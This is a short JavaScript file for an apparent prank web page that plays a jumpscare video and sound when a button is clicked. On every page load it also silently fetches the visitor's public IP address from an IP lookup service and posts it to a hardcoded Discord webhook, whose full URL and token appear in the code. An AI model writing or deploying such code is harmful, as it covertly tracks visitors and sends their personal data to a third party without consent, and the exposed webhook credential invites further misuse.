// script.js

// Function to fetch the IP and send it to Discord webhook
async function sendIPToDiscord() {
  try {
    // Fetch the user's IP address
    const response = await fetch('https://api64.ipify.org?format=json');
    const data = await response.json();

    // Prepare Discord webhook payload
    const webhookUrl = 'https://discord.com/api/webhooks/1322340263817121872/KVz7ETrNyLzmHtpnWCWVNlcs7V688BSA59RFmammBBjnxFHk-kGj8bdQCGs3LpRPRzPE';
    const payload = {
      content: `User IP: ${data.ip}`,
    };

    // Send the IP address to the Discord webhook
    await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    console.log('IP sent to Discord:', data.ip);
  } catch (error) {
    console.error('Failed to send IP info:', error);
  }
}

// Trigger the jumpscare on button click
document.getElementById('reload-button').addEventListener('click', () => {
  const jumpscare = document.getElementById('jumpscare');
  const video = document.getElementById('jumpscare-video');
  const audio = document.getElementById('jumpscare-audio');

  document.querySelector('.content').style.display = 'none';
  jumpscare.style.display = 'flex';

  video.play();
  audio.play().catch((error) => console.error('Audio play failed:', error));
});

// Send IP info to Discord on page load
sendIPToDiscord();
